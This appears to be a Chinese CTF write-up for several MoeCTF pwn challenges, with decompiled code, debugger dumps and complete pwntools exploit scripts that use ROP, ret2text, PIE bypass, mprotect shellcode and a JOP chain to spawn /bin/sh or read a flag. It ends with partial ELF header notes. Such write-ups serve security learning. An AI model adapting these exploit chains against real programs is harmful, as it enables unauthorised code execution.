#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int seed;int main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+Ch] [rbp-14h] BYREF  int i; // [rsp+10h] [rbp-10h]  int v6; // [rsp+14h] [rbp-Ch]  unsigned int v7;  //init(argc, argv, envp);  //initseed();  srand(seed);  puts(&quot;My lock looks strange—can you help me?&quot;);  for ( int i = 1; i &lt;= 10; ++i )&#123;    printf(&quot;password %2d &gt;&quot;, i);    v6 = rand() % 10000;    printf(&quot; %d\n&quot;,v6);  &#125;  return 0;&#125;
My lock looks strange—can you help me?password  1 &gt; 9383password  2 &gt; 886password  3 &gt; 2777password  4 &gt; 6915password  5 &gt; 7793password  6 &gt; 8335password  7 &gt; 5386password  8 &gt; 492password  9 &gt; 6649password 10 &gt; 1421
ubuntu@LAPTOP-RA1SUD0S:~/Moectf/randomlock$ ./pwnMy lock looks strange—can you help me?password 1&gt;9383password 2&gt;886password 3&gt;2777password 4&gt;6915password 5&gt;7793password 6&gt;8335password 7&gt;5386password 8&gt;492password 9&gt;6649password 10&gt;1421It opened—how did you do that?hello pwner flag is accessable
syslock
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  write(1, &quot;My lock looks strange—can you help me?\n&quot;, 0x29uLL);  write(1, &quot;choose mode\n&quot;, 0xCuLL);  i = input();  if ( i &gt; 4 )    lose();  write(1, &quot;Input your password\n&quot;, 0x14uLL);  read(0, (char *)&amp;s + i, 0xCuLL);  if ( i != 59 )    lose();  cheat();  return 0;&#125;
ssize_t cheat()&#123;  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF  write(1, &quot;Developer Mode.\n&quot;, 0x10uLL);  return read(0, buf, 0x100uLL);&#125;
.bss:0000000000404080 i               dd ?                    ; DATA XREF: main+4E↑w.bss:0000000000404080                                         ; main+54↑r ....bss:0000000000404084                 align 20h.bss:00000000004040A0                 public s.bss:00000000004040A0 s               db    ? ;               ; DATA XREF: main+8A↑o.bss:00000000004040A1                 db    ? ;.bss:00000000004040A2                 db    ? ;....bss:00000000004040EE                 db    ? ;.bss:00000000004040EF                 db    ? ;.bss:00000000004040EF _bss            ends
i&lt;=4和i=59不可能同时达到，显然是在read(0, (char *)&amp;s + i, 0xCuLL);这里修改，s与i差0x20，也就是32
没有后门函数，要想用system和/bin/sh，此时只能写在栈上，获得/bin/sh00的地址就有点不现实，要是能写在bss段上就好了
于是我们利用ret2text使函数回到第二次写入bss段的地址，此时i还是0x3b，可以通过检查
于是我们将/bin/sh00写入，
第二次写入时利用gadget将rax改为0x3b，此时syscall就会实现execve
将rsi、rdx设为0，此时syscall就会实现system
在利用gadget将/bin/sh00弹入rdi，这样就可以实现system(“/bin/sh”)
pwndbg&gt; tele 0x4040db00:0000│ rsi 0x4040db (s+59) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */01:0008│     0x4040e3 (s+67) ◂— 0xa /* &#x27;\n&#x27; */02:0010│     0x4040eb (s+75) ◂— 0
p = start()p.recvuntil(b&quot;choose mode\n&quot;)p.sendline(b&#x27;-32&#x27;)p.recvuntil(b&quot;Input your password\n&quot;)p.sendline(p64(0x3b))p.recvuntil(b&#x27;Developer Mode.\n&#x27;)payload1=b&#x27;a&#x27;*0x48+p64(0x401324)p.sendline(payload)pop_rax_ret_addr = 0x401244                # pop rax; retpop_rdi_rsi_rdx_ret_addr = 0x40123C        # pop rdi; pop rsi; pop rdx; retsyscall = 0x401230                         # syscall 地址bss_addr = 0x4040db                        # bss段地址bin_sh = b&#x27;/bin/sh\x00&#x27;payload2 =  b&#x27;A&#x27; * 0x48payload2 += p64(pop_rax_ret_addr)payload2 += p64(0x3b)                      # rax = 0x3b (execve系统调用号)payload2 += p64(pop_rdi_rsi_rdx_ret_addr)payload2 += p64(bss_addr)                  # rdi = 指向/bin/sh的地址payload2 += p64(0)                         # rsi = NULLpayload2 += p64(0)                         # rdx = NULLpayload2 += p64(syscall)p.recvuntil(b&quot;Input your password\n&quot;)p.sendline(bin_sh)p.recvuntil(b&#x27;Developer Mode.\n&#x27;)p.sendline(payload2)p.interactive()
str_check
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  char dest[24]; // [rsp+0h] [rbp-20h] BYREF  size_t n; // [rsp+18h] [rbp-8h] BYREF  init(argc, argv, envp);  puts(&quot;What can u say?&quot;);  __isoc99_scanf(&quot;%255s&quot;, str);  puts(&quot;So,what size is it?&quot;);  __isoc99_scanf(&quot;%zu&quot;, &amp;n);  len = strlen(str);  if ( (unsigned __int64)len &gt; 0x18 )  &#123;    puts(&quot;Oh,too much.&quot;);    exit(1);  &#125;  if ( !strncmp(str, &quot;meow&quot;, 4uLL) )    memcpy(dest, str, n);  else    strncpy(dest, str, n);  puts(&quot;You&#x27;re right.&quot;);  return 0;&#125;
.text:0000000000401236 ; int backdoor().text:0000000000401236                 public backdoor.text:0000000000401236 backdoor        proc near.text:0000000000401236 ; __unwind &#123;.text:0000000000401236                 endbr64.text:000000000040123A                 push    rbp.text:000000000040123B                 mov     rbp, rsp.text:000000000040123E                 lea     rax, command    ; &quot;/bin/sh&quot;.text:0000000000401245                 mov     rdi, rax        ; command.text:0000000000401248                 call    _system.text:000000000040124D                 nop.text:000000000040124E                 pop     rbp.text:000000000040124F                 retn.text:000000000040124F ; &#125; // starts at 401236.text:000000000040124F backdoor        endp
1. strcpy(dest, src)

功能：将源字符串src复制到目标缓冲区dest，包括'\0'。
'\0'处理：

会自动复制源字符串末尾的'\0'到dest中。
风险：不检查dest的容量，如果src长度超过dest可容纳的空间，会导致缓冲区溢出（'\0'也可能越界写入）。


2. strncpy(dest, src, n)

功能：最多复制n个字节从src到dest。
'\0'处理：

如果src的长度小于n：会复制src的全部内容（包括'\0'），并在剩余空间填充'\0'直到总长度为n。
如果src的长度大于等于n：只复制前n个字节，不会添加'\0'，此时dest可能不是一个有效的字符串（缺少结束标志）。

注意：使用后需手动确保dest以'\0'结尾，例如
strncpy(dest, src, n);dest[n-1] = &#x27;\0&#x27;;  // 强制添加结束符（避免溢出）

3. strcat(dest, src)

功能：将src追加到dest末尾（覆盖dest原有的'\0'）。
'\0'处理：

首先找到dest中已有的'\0'，从该位置开始复制src的内容（包括src的'\0'）。
风险：不检查dest的剩余空间，若dest容量不足，会导致缓冲区溢出。


4. strncat(dest, src, n)

功能：最多将src的前n个字符追加到dest末尾。
'\0'处理：

无论是否复制了n个字符，最终都会在dest末尾添加一个'\0'。
若src长度小于n，则复制全部src内容（包括其'\0'）后，不再额外添加'\0'（避免重复）。

安全性：比strcat更安全，因为限制了追加长度，且确保dest以'\0'结尾。

5. memcpy(dest, src, n)

功能：从src复制n个字节到dest（对所有数据类型通用，不仅限于字符串）。
'\0'处理：

完全不处理'\0'：'\0'仅被视为普通字节，若src中包含'\0'且在n范围内，会被正常复制。
不会自动添加'\0'：即使src是字符串，复制后dest也可能缺少结束标志（除非n包含src的'\0'）。

风险：若用于字符串复制且n超过实际长度，可能导致dest无'\0'结束符，后续操作（如printf）会越界访问。

6. strlen(s)

功能：计算字符串s的长度（不包含'\0'）。
'\0'处理：

从s的首地址开始计数，直到遇到'\0'停止（'\0'是终止条件）。
若s中没有'\0'，会一直访问到非法内存，导致未定义行为（如程序崩溃）。


7. strcmp(s1, s2)、strncmp(s1, s2, n)

功能：比较字符串（strcmp比较到'\0'为止，strncmp最多比较n个字符）。
'\0'处理：

strcmp：当任一字符串遇到'\0'时停止比较。
strncmp：若在n个字符内遇到'\0'，会将其视为小于任何非'\0'字符（按 ASCII 值，'\0'为 0）。


p = start()p.recvuntil(b&quot;What can u say?\n&quot;)payload=b&#x27;meow\0&#x27;+b&#x27;a&#x27;*19+b&#x27;0&#x27;*16+p64(0x40123e)   #len=4，执行memcpyp.sendline(payload)p.recvuntil(b&quot;So,what size is it?\n&quot;)p.sendline(str(len(payload)))p.interactive()
xdulaker
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  menu();  while ( 1 )  &#123;    while ( 1 )    &#123;      putchar(62);      __isoc99_scanf(&quot;%d&quot;, &amp;opt);      if ( opt != 1 )        break;      pull();    &#125;    if ( opt == 2 )    &#123;      photo();    &#125;    else    &#123;      if ( opt != 3 )        exit(0);      laker();    &#125;  &#125;&#125;
int menu()&#123;  puts(&quot;A freshman has walked into the lake.&quot;);  puts(&quot;1.Pull him out&quot;);  puts(&quot;2.Take a photo of him&quot;);  puts(&quot;3.Walk into the lake.&quot;);  return puts(&quot;Your choice&quot;);&#125;
int pull()&#123;  return printf(&quot;Thanks,I&#x27;ll give you a gift:%p\n&quot;, &amp;opt);&#125;
int photo()&#123;  _BYTE buf[80]; // [rsp+0h] [rbp-50h] BYREF  puts(&quot;Hey,what&#x27;s your name?!&quot;);  read(0, buf, 0x40uLL);  return puts(&quot;I will teach you a lesson.&quot;);&#125;
ssize_t laker()&#123;  _BYTE s1[48]; // [rsp+0h] [rbp-30h] BYREF  if ( memcmp(s1, &quot;xdulaker&quot;, 8uLL) )  &#123;    puts(&quot;You are not him.&quot;);    exit(0);  &#125;  puts(&quot;welcome,xdulaker&quot;);  return read(0, s1, 0x100uLL);&#125;
先选一接收opt_addr，再选2写入能使选3能成功执行的payload，最后选三实现ret2text
注意到// [rsp+0h] [rbp-50h] BYREF和// [rsp+0h] [rbp-30h] BYREF，中间插入0x20个字符就可以了
00:0000│ rsi rsp 0x7ffe4160bea0 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)... ↓            3 skipped04:0020│-030     0x7ffe4160bec0 ◂— 0x72656b616c756478 (&#x27;xdulaker&#x27;)05:0028│-028     0x7ffe4160bec8 —▸ 0x7ffe4160bef0 —▸ 0x7ffe4160bf00 ◂— 106:0030│-020     0x7ffe4160bed0 —▸ 0x7ffe4160c018 —▸ 0x7ffe4160c9e8 ◂— &#x27;/home/ubuntu/Moectf/xdulaker/pwn_patched&#x27;07:0038│-018     0x7ffe4160bed8 ◂— 008:0040│-010     0x7ffe4160bee0 —▸ 0x7ffe4160bf00 ◂— 109:0048│-008     0x7ffe4160bee8 —▸ 0x7ffe4160c018 —▸ 0x7ffe4160c9e8 ◂— &#x27;/home/ubuntu/Moectf/xdulaker/pwn_patched&#x27;0a:0050│ rbp     0x7ffe4160bef0 —▸ 0x7ffe4160bf00 ◂— 10b:0058│+008     0x7ffe4160bef8 —▸ 0x61d51ba5c448 (main+112) ◂— jmp main+28
00:0000│ rax rdi rsp 0x7ffe4160bec0 ◂— 0x72656b616c756478 (&#x27;xdulaker&#x27;)01:0008│-028         0x7ffe4160bec8 —▸ 0x7ffe4160bef0 —▸ 0x7ffe4160bf00 ◂— 102:0010│-020         0x7ffe4160bed0 —▸ 0x7ffe4160c018 —▸ 0x7ffe4160c9e8 ◂— &#x27;/home/ubuntu/Moectf/xdulaker/pwn_patched&#x27;03:0018│-018         0x7ffe4160bed8 ◂— 004:0020│-010         0x7ffe4160bee0 —▸ 0x7ffe4160bf00 ◂— 105:0028│-008         0x7ffe4160bee8 —▸ 0x7ffe4160c018 —▸ 0x7ffe4160c9e8 ◂— &#x27;/home/ubuntu/Moectf/xdulaker/pwn_patched&#x27;06:0030│ rbp         0x7ffe4160bef0 —▸ 0x7ffe4160bf00 ◂— 107:0038│+008         0x7ffe4160bef8 —▸ 0x61d51ba5c45f (main+135) ◂— jmp main+28
利用固定偏移找到backdoor真实地址，就可以实现PIE绕过
.data:0000000000004010                 public opt.data:0000000000004010 opt             dd 5                    ; DATA XREF: pull+8↑o.data:0000000000004010                                         ; main+26↑o ....data:0000000000004010 _data           ends
.text:0000000000001249                 public backdoor.text:0000000000001249 backdoor        proc near.text:0000000000001249 ; __unwind &#123;.text:0000000000001249                 endbr64.text:000000000000124D                 push    rbp.text:000000000000124E                 mov     rbp, rsp.text:0000000000001251                 lea     rax, command    ; &quot;/bin/sh&quot;.text:0000000000001258                 mov     rdi, rax        ; command.text:000000000000125B                 call    _system.text:0000000000001260                 nop.text:0000000000001261                 pop     rbp.text:0000000000001262                 retn.text:0000000000001262 ; &#125; // starts at 1249.text:0000000000001262 backdoor        endp
p = start()p.recvuntil(b&#x27;&gt;&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(b&quot;Thanks,I&#x27;ll give you a gift:&quot;)opt_bytes=p.recvuntil(b&#x27;\n&#x27;)opt_addr_str = opt_bytes.strip().decode(&#x27;utf-8&#x27;)opt_addr = int(opt_addr_str, 16)log.success(hex(opt_addr))data_base=opt_addr-0x10p.recvuntil(b&#x27;&gt;&#x27;)p.sendline(b&#x27;2&#x27;)p.recvuntil(b&quot;Hey,what&#x27;s your name?!\n&quot;)payload1=b&#x27;a&#x27;*0x20+b&#x27;xdulaker&#x27;p.send(payload1)p.recvuntil(b&#x27;&gt;&#x27;)p.sendline(b&#x27;3&#x27;)backdoor_addr=0x1251+data_base-0x4000log.success(hex(backdoor_addr))payload2=b&#x27;A&#x27;*0x38+p64(backdoor_addr)p.send(payload2)p.interactive()
shellbox
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  _BYTE v4[4]; // [rsp+8h] [rbp-8h] BYREF  int n9; // [rsp+Ch] [rbp-4h]  init(argc, argv, envp);  sandbox();  n9 = 0;  puts(&quot;You have a box, fill it.&quot;);  read(0LL, &amp;buf, 256LL);  puts(&quot;Now, leave your name..&quot;);  while ( n9 != 1 )  &#123;    if ( n9 &gt; 9 )    &#123;      puts(&quot;Why is it so long?&quot;);      break;    &#125;    putchar(62LL);    read(0LL, &amp;v4[8 * n9++], 8LL);  &#125;  puts(&quot;Bye!&quot;);  return 0;&#125;
__int64 sandbox()&#123;  int v0; // r8d  int v1; // r9d  int v2; // r8d  int v3; // r9d  __int64 v5; // [rsp+8h] [rbp-8h]  v5 = seccomp_init(2147418112LL);  seccomp_rule_add(v5, 0, 59, 0, v0, v1);  seccomp_rule_add(v5, 0, 2, 0, v2, v3);  return seccomp_load(v5);&#125;
.bss:00000000004CEB60                 public buf.bss:00000000004CEB60 buf             db    ? ;               ; DATA XREF: main+3B↑o.bss:00000000004CEB61                 db    ? ;.bss:00000000004CEB62                 db    ? ;....bss:00000000004CEC5E                 db    ? ;.bss:00000000004CEC5F                 db    ? ;
ubuntu@LAPTOP-RA1SUD0S:~/Moectf/shellbox$ checksec pwn[*] &#x27;/home/ubuntu/Moectf/shellbox/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
ubuntu@LAPTOP-RA1SUD0S:~/Moectf/shellbox$ seccomp-tools dump ./pwn line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008 0005: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0008 0006: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x06 0x00 0x00 0x00000000  return KILL
这题是静态链接，尽管开了NX但是可以使用mprotect开权限
先在bss段上布置shellcode，再想办法使用mprotect
先进行n9的绕过，第一次恰好是修改rbp-0x8，将n9改为1即可
因为我们人为增加了n9，所以第二次改的是rbp+0x8，构造ROP链即可
先用gadget把参数传递好，再调用mprotect，再调用shellcode
执行前
00:0000│ rsp 0x7ffff8a938b0 —▸ 0x4ceb60 (buf) ◂— 0x67616c662fb848
0x4cd000           0x4cf000 rw-p     2000   cd000 Moectf/shellbox/pwn
执行后
00:0000│ rsp 0x7ffff8a938b0 —▸ 0x4ceb60 (buf) ◂— movabs rax, 0x67616c662f /* 0x67616c662fb848 */
0x4ce000           0x4cf000 rwxp     1000   ce000 Moectf/shellbox/pwn
shellcode的构造就省略了
p=start()p.recvuntil(b&quot;You have a box, fill it.&quot;)shellcode =&quot;&quot;&quot;mov rax,0x0067616c662fpush raxmov rsi,rspxor rdx,rdxmov rax,257syscallxor rdi,rdiinc rdimov rsi,raxxor rdx,rdxmov r10,0x100mov rax,40syscall&quot;&quot;&quot;#shell=asm(shellcode)#p.send(shell+p64(0)*0x10)p.send(b&#x27;H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05&#x27;)p.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x000100000001))p.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x401a40))    #pop rdip.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x4CE000))    #addrp.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x401a42))    #pop rsip.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x1000))      #sizep.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x401a44))    #pop rdxp.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x7))         #read,write,execvep.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x443520))    #mprotectp.recvuntil(b&quot;&gt;&quot;)p.send(p64(0x4CEB60))    #shellcodep.interactive()
JOP
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdout, 0LL);  puts(&quot;[[ Programmable MoeBot v1.0 ]]\nPlease specify the gestures.&quot;);  program();  printf(&quot;Registered %zu gestures. Executing the program...\n&quot;, n_gestures);  execute(&amp;gestures);  exit(0);&#125;
unsigned __int64 program()&#123;  unsigned __int64 result; // rax  int v1; // [rsp+Ch] [rbp-14h] BYREF  __int64 v2; // [rsp+10h] [rbp-10h]  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  v2 = 0LL;  while ( (unsigned __int64)n_gestures &lt;= 7 )  &#123;    puts(&quot;0. Finish\n1. Walk\n2. Wave Hands\n3. Jump\n4. Turn around\n5. Stand still&quot;);    printf(&quot;Choose your gesture: &quot;);    if ( (int)_isoc99_scanf(&quot;%u&quot;, &amp;v1) &lt;= 0 )      exit(1);    switch ( v1 )    &#123;      case 0:        goto LABEL_15;      case 1:        gestures[v2] = walk;        ++n_gestures;        goto LABEL_11;      case 2:        gestures[v2] = wave_hands;        ++n_gestures;        goto LABEL_11;      case 3:        gestures[v2] = jump;        ++n_gestures;        goto LABEL_11;      case 4:        gestures[v2] = turn;        ++n_gestures;        goto LABEL_11;      case 5:        gestures[v2] = stand_still;        ++n_gestures;LABEL_11:        printf(&quot;What should I say after this gesture? &quot;);        getchar();        if ( !fgets(&amp;talks[16 * v2], 16, stdin) )          exit(1);        return result;      default:        puts(&quot;Invalid choice, try again.&quot;);        break;    &#125;    ++v2;  &#125;LABEL_15:  result = v3 - __readfsqword(0x28u);  if ( result )    _stack_chk_fail();  return result;&#125;
__int64 __fastcall execute(__int64 a1)&#123;  __int64 n_gestures; // rax  unsigned __int64 i; // [rsp+10h] [rbp-10h]  for ( i = 0LL; ; ++i )  &#123;    n_gestures = n_gestures;    if ( i &gt;= n_gestures )      break;    (*(void (**)(void))(8 * i + a1))();    printf(&quot;%s&quot;, &amp;talks[16 * i]);    sleep(1u);  &#125;  return n_gestures;&#125;
.bss:0000000000404040                 public n_gestures.bss:0000000000404040 n_gestures      dq ?                    ; DATA XREF: execute:loc_40117D↑r.bss:0000000000404040                                         ; program+C5↑r ....bss:0000000000404048                 align 20h.bss:0000000000404060                 public talks.bss:0000000000404060 ; char talks[128].bss:0000000000404060 talks           db 80h dup(?)           ; DATA XREF: execute+45↑o.bss:0000000000404060                                         ; program+1E6↑o.bss:00000000004040E0                 public gestures.bss:00000000004040E0 ; _QWORD gestures[8].bss:00000000004040E0 gestures        dq 8 dup(?)             ; DATA XREF: program+B3↑o.bss:00000000004040E0                                         ; program+E8↑o ....bss:00000000004040E0 _bss            ends.prgend:0000000000404120 ;
我们从program中发现选择无效值，就可以使v2增加，达到在gestures后面写
先选择8次无效值使v2变为8，此时talk恰好落在gestures上，可以被execute执行，而原来的gestures被放在后面
于是可以构造JOP链，观察到
.text:0000000000401231                 public gift.text:0000000000401231 gift            proc near.text:0000000000401231 ; __unwind &#123;.text:0000000000401231                 endbr64.text:0000000000401235                 mov     rax, rdi.text:0000000000401238                 mov     rdi, [rax+8].text:000000000040123C                 call    qword ptr [rax+10h].text:000000000040123F                 retn.text:000000000040123F gift            endp
.text:0000000000401228                 call    cs:system_ptr
可以将rax+0x8作为参数，然后执行rax+0x10
于是先写入gift地址，再写入/bin/sh00地址，再写入call system，即可完成
pwndbg&gt; tele 0x4040E000:0000│     0x4040e0 (gestures) —▸ 0x401231 (gift) ◂— endbr6401:0008│     0x4040e8 (gestures+8) —▸ 0x404110 (gestures+48) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */02:0010│     0x4040f0 (gestures+16) —▸ 0x401228 (unreachable+18) ◂— call qword ptr [rip + 0x2d92]03:0018│     0x4040f8 (gestures+24) ◂— 0xa /* &#x27;\n&#x27; */04:0020│     0x404100 (gestures+32) —▸ 0x401228 (unreachable+18) ◂— call qword ptr [rip + 0x2d92]05:0028│     0x404108 (gestures+40) ◂— 0xa /* &#x27;\n&#x27; */06:0030│     0x404110 (gestures+48) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */07:0038│     0x404118 (gestures+56) ◂— 0xa /* &#x27;\n&#x27; */pwndbg&gt;08:0040│     0x404120 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */09:0048│     0x404128 —▸ 0x40000a ◂— 0x20000000000000a:0050│     0x404130 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */0b:0058│     0x404138 —▸ 0x40000a ◂— 0x20000000000000c:0060│     0x404140 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */0d:0068│     0x404148 —▸ 0x40000a ◂— 0x20000000000000e:0070│     0x404150 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */0f:0078│     0x404158 —▸ 0x40000a ◂— 0x2000000000000
p = start()p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;6&quot;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;6&quot;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;6&quot;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;6&quot;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;6&quot;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;6&quot;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;6&quot;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;6&quot;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;1&quot;)p.recvuntil(b&quot;What should I say after this gesture? &quot;)p.sendline(p64(0x401231)+b&#x27;\x10\x41\x40\x00\x00\x00\x00&#x27;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;1&quot;)p.recvuntil(b&quot;What should I say after this gesture? &quot;)p.sendline(p64(0x401228))p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;1&quot;)p.recvuntil(b&quot;What should I say after this gesture? &quot;)p.sendline(p64(0x401228))p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;1&quot;)p.recvuntil(b&quot;What should I say after this gesture? &quot;)p.sendline(b&#x27;/bin/sh\x00&#x27;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;1&quot;)p.recvuntil(b&quot;What should I say after this gesture? &quot;)p.sendline(b&#x27;/bin/sh\x00&#x27;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;1&quot;)p.recvuntil(b&quot;What should I say after this gesture? &quot;)p.sendline(b&#x27;/bin/sh\x00&#x27;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;1&quot;)p.recvuntil(b&quot;What should I say after this gesture? &quot;)p.sendline(b&#x27;/bin/sh\x00&#x27;)p.recvuntil(b&quot;Choose your gesture: &quot;)p.sendline(b&quot;1&quot;)p.recvuntil(b&quot;What should I say after this gesture? &quot;)p.sendline(b&#x27;/bin/sh\x00&#x27;)p.interactive()
Ret2dlresolve
这个还没有理解完全，题解写的不是太完全太好，望理解，wp在最后面
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdout, 0LL);  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  vuln();  return 0;&#125;
ssize_t vuln()&#123;  _BYTE buf[112]; // [rsp+0h] [rbp-70h] BYREF  return read(0, buf, 0x100uLL);&#125;
.text:0000000000401156 ; void magic().text:0000000000401156                 public magic.text:0000000000401156 magic           proc near.text:0000000000401156 ; __unwind &#123;.text:0000000000401156                 endbr64.text:000000000040115A                 push    rbp.text:000000000040115B                 mov     rbp, rsp.text:000000000040115E                 pop     rdi.text:000000000040115F                 retn.text:000000000040115F magic           endp.text:000000000040115F.text:0000000000401160 ; ---------------------------------------------------------------------------.text:0000000000401160                 pop     rsi.text:0000000000401161                 retn.text:0000000000401161 ; ---------------------------------------------------------------------------.text:0000000000401162                 db 90h.text:0000000000401163 ; ---------------------------------------------------------------------------.text:0000000000401163                 pop     rbp.text:0000000000401164                 retn.text:0000000000401164 ; &#125; // starts at 401156
没有后门，也没有任何信息泄露，只有写入足够多内容的能力，是NO RELRO或Partial RELRO，这时候可以使用Ret2dlresolve
ELF Header
32位
/* The ELF file header.  This appears at the start of every ELF file.  */#define EI_NIDENT (16)typedef struct&#123;  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */  Elf32_Half	e_type;			/* Object file type */  Elf32_Half	e_machine;		/* Architecture */  Elf32_Word	e_version;		/* Object file version */  Elf32_Addr	e_entry;		/* Entry point virtual address */  Elf32_Off		e_phoff;		/* Program header table file offset */  Elf32_Off		e_shoff;		/* Section header table file offset */  Elf32_Word	e_flags;		/* Processor-specific flags */  Elf32_Half	e_ehsize;		/* ELF header size in bytes */  Elf32_Half	e_phentsize;		/* Program header table entry size */  Elf32_Half	e_phnum;		/* Program header table entry count */  Elf32_Half	e_shentsize;		/* Section header table entry size */  Elf32_Half	e_shnum;		/* Section header table entry count */  Elf32_Half	e_shstrndx;		/* Section header string table index */&#125; Elf32_Ehdr;
64位
typedef struct &#123;        unsigned char   e_ident[EI_NIDENT];        Elf64_Half      e_type;        Elf64_Half      e_machine;        Elf64_Word      e_version;        Elf64_Addr      e_entry;        Elf64_Off       e_phoff;        Elf64_Off       e_shoff;     // 重要: 我们下一步的解析目标就从这里开始,这个段表的文件内偏移        Elf64_Word      e_flags;        Elf64_Half      e_ehsize;        Elf64_Half      e_phentsize;        Elf64_Half      e_phnum;        Elf64_Half      e_shentsize;        Elf64_Half      e_shnum;     // 重要: 这里给出了段表中的表项的个数        Elf64_Half      e_shstrndx;  // 重要: 这里给出了段表中引用的用于表示段名的字符串表的段表项索引&#125; Elf64_Ehdr;
它们的内容结构其实是一样的（不是全部，可以基本认为是完全等价的），只是存储宽度不一样而已

e_ident：ELF 文件的魔数和其他信息。
前 4 字节为 ELFMAG 即 \x7fELF 。
第 5 字节为 ELF 文件类型，值为 ELFCLASS32(1) 代表 32 位，值为 ELFCLASS64(2) 代表 64 位。
第 6 字节为 ELF 的字节序，0 为无效格式，1 为小端格式，2 为大端格式.。
第 7 字节为 ELF 版本，一般为 1 ，即 1.2 版本。
后面 9 字节没有定义一般填 0 ，有些平台会使用这 9 个字节作为扩展标志。
e_type：表示ELF文件类型，如可执行文件、共享对象文件（.so）、可重定位文件（.o）等。
e_machine：表示目标体系结构，即程序的目标平台，如 x86、ARM 等。相关常量以 EM_ 开头。
e_version：ELF 文件版本号，一般为常数 1 。
e_entry：表示程序入口点虚拟地址。操作系统加载完程序后从这个地址开始执行进程的命令。可重定位文件一般没有入口地址，则这个值为 0 
e_phoff：表示程序头表的文件偏移量。
e_shoff：表示节表的文件偏移量。
e_flags：表示处理器特定标志。
e_ehsize：表示 ELF 文件头的大小。
e_phentsize：表示程序头表中每个表项的大小。
e_phnum：表示程序头表中表项的数量。
e_shentsize：表示节表中每个表项的大小。
e_shnum：表示节表中表项的数量。
e_shstrndx：表示节表中字符串表的索引。

ELF Section Header Table
32位
 typedef struct &#123;	Elf32_Word	sh_name;	Elf32_Word	sh_type;	Elf32_Word	sh_flags;	Elf32_Addr	sh_addr;	Elf32_Off	sh_offset;	Elf32_Word	sh_size;	Elf32_Word	sh_link;	Elf32_Word	sh_info;	Elf32_Word	sh_addralign;	Elf32_Word	sh_entsize;&#125; Elf32_Shdr;
64位
typedef struct &#123;	Elf64_Word	sh_name; //1	Elf64_Word	sh_type;	Elf64_Xword	sh_flags;	Elf64_Addr	sh_addr;	Elf64_Off	sh_offset;	Elf64_Xword	sh_size;	Elf64_Word	sh_link;	Elf64_Word	sh_info;	Elf64_Xword	sh_addralign;	Elf64_Xword	sh_entsize;&#125; Elf64_Shdr;

sh_name：表示节的名称在字符串表中的索引。字符串表节存储了所有节的名称，sh_name 指定了节的名称在字符串表中的位置。
sh_type：表示节的类型，指定了节的用途和属性。




Name
Value




SHT_NULL
0


SHT_PROGBITS : 程序/数据/
1


SHT_SYMTAB : 符号表
2


SHT_STRTAB : 字符串表
3


SHT_RELA : 重定位表
4


SHT_HASH: HASH 表
5


SHT_DYNAMIC: 动态链接
6


SHT_NOTE : 注释
